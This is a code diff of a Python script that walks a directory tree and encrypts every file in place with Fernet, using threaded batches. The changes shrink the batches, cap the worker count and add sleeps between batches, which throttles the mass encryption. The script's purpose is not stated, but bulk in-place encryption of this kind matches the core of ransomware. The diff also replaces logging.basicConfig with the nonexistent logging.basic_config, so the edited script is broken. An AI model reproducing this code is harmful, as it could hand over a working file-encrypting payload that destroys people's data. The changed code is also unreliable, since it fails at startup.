@@ -11,7 +11,7 @@ from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Setup logging
-logging.basicConfig(level=logging.DEBUG,
+logging.basic_config(level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s',
                     handlers=[
                         logging.StreamHandler()
@@ -69,7 +69,7 @@ def get_all_files(root_dir, exclude_paths):
                 yield file_path
 
 # Function to process files in chunks
-def process_files_in_chunks(files, chunk_size=10):
+def process_files_in_chunks(files, chunk_size=5):
     while True:
         chunk = []
         try:
@@ -94,16 +94,17 @@ signal.signal(signal.SIGBUS, bus_error_handler)
 signal.signal(signal.SIGSEGV, segfault_handler)
 
 # Encrypt files in chunks
-def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
+def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=5):
     all_files = get_all_files(root_dir, exclude_paths)
     for chunk in process_files_in_chunks(all_files, chunk_size):
-        with ThreadPoolExecutor() as executor:
+        with ThreadPoolExecutor(max_workers=2) as executor:
             futures = [executor.submit(encrypt_file, file) for file in chunk]
             for future in as_completed(futures):
                 try:
                     future.result()
                 except Exception as e:
                     logging.error(f"Error processing a file: {e}")
+        time.sleep(2)  # Add delay between batches
 
 # Main function
 def main():
@@ -121,6 +122,8 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
 
 
 
